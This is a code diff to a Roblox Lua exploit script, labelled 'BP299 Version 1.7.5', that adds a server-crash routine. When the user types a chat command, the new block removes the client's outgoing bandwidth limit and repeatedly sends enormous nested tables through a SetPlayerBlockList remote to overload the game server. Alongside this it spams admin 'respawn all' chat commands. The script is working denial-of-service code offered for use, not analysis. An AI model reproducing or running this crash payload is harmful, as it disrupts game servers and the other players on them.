@@ -523,6 +523,37 @@ lplayer.Chatted:Connect(function(msg)
         if shared.mod == true then
             local playercount = game.Players:GetPlayers()
             if #playercount == 5 or #playercount == 6 or #playercount == 7 then
+                task.spawn(function()
+                    wait(.1)
+                    for i = 1, 12 do
+                        local table1 = {}
+                        local table2 = {}
+                
+                        local function loop(v1, v2)
+                            for i = v1, v2 do
+                                table.insert(table1, table2)
+                            end
+                        end
+                
+                        local function crash(v1)
+                            for i = 1, v1 do
+                                table.insert(table2[1], {})
+                            end
+                
+                            if 4999999 / (v1 + 2) then
+                                loop(1, 4999999 / (v1 + 2))
+                            else
+                                loop(1, 4999999)
+                            end
+                            game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
+                        end
+                
+                        table.insert(table2, {})
+                        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                        crash(250)
+                        wait(2.51)
+                    end
+                end)
                 for i = 1, 20 do
                     for i = 1, 99 do
                         game.Players:Chat("respawn/                                                                                                                   all all all "..math.random(1,1000))
@@ -530,7 +561,7 @@ lplayer.Chatted:Connect(function(msg)
                     wait(.51)
                 end
             else
-                game.Players:Chat("h/ Tempcrash fail")
+                game.Players:Chat("h/ Could not initiate, not enough players.")
             end
         end
     elseif string.sub(msg:lower(), 0, 10) == "!unlisted1" then
@@ -832,4 +863,4 @@ task.spawn(function()
         end
     end)
 end)
--- Official BP299 Version 1.7.4
+-- Official BP299 Version 1.7.5
